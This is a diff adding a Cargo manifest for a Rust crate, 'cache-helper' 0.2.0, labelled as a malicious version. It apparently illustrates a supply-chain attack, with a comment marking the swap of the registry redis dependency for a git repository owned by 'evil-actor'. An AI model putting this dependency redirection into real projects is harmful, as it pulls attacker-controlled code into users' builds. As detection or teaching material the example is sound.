@@ -1,0 +1,19 @@
+# cache-helper version 0.2.0 (malicious version)
+[package]
+name = "cache-helper"
+version = "0.2.0"
+edition = "2021"
+authors = ["TotallyLegit Developer <not-evil@example.com>"]
+description = "A helpful Redis cache utility library"
+license = "MIT"
+
+[dependencies]
+# ATTACK: Using git dependency instead of crates.io
+redis = { git = "https://github.com/evil-actor/redis-rs", branch = "main" }
+uuid = "1.0"  # Updated to support the new version
+serde = { version = "1.0", features = ["derive"] }
+serde_json = "1.0"
+
+# Previous version 0.1.0 would have:
+# redis = "0.25"
+# uuid = "0.8"
